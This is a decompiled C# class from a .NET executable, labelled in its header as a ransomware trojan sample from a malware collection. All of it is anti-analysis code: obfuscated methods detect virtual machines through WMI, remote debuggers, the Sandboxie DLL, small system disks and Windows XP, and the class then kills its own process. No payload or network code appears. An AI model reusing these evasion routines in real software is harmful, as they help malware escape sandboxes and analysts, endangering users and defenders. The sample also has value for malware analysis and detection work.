// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.ghEykQIAJr
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace MufMaOSvGyvz
{
  internal class ghEykQIAJr
  {
    public static void aiPqAgDxThSDE()
    {
      if ((ghEykQIAJr.kNJZaDsXbWYmUdO() || ghEykQIAJr.CmOCZJRfKEYgY() || ghEykQIAJr.ITHbNNuWEzvcy() || ghEykQIAJr.KQTbTNGxpggJ() ? 0 : (!ghEykQIAJr.GMkUrUdhErRTAQ() ? 1 : 0)) == 0)
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool KQTbTNGxpggJ()
    {
      bool flag;
      try
      {
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
        {
          flag = true;
          goto label_5;
        }
      }
      catch
      {
      }
      flag = false;
label_5:
      return flag;
    }

    private static bool GMkUrUdhErRTAQ()
    {
      bool flag;
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
        {
          flag = true;
          goto label_5;
        }
      }
      catch
      {
      }
      flag = false;
label_5:
      return flag;
    }

    private static bool kNJZaDsXbWYmUdO()
    {
      bool flag;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if ((lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") ? 0 : (!(managementBaseObject["Model"].ToString() == "VirtualBox") ? 1 : 0)) == 0)
              {
                flag = true;
                goto label_19;
              }
            }
          }
        }
      }
      catch
      {
      }
      flag = false;
label_19:
      return flag;
    }

    private static bool CmOCZJRfKEYgY()
    {
      bool bool_0 = false;
      try
      {
        ghEykQIAJr.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_0);
        return bool_0;
      }
      catch
      {
        return bool_0;
      }
    }

    private static bool ITHbNNuWEzvcy()
    {
      try
      {
        return ghEykQIAJr.GetModuleHandle("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string string_0);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);
  }
}
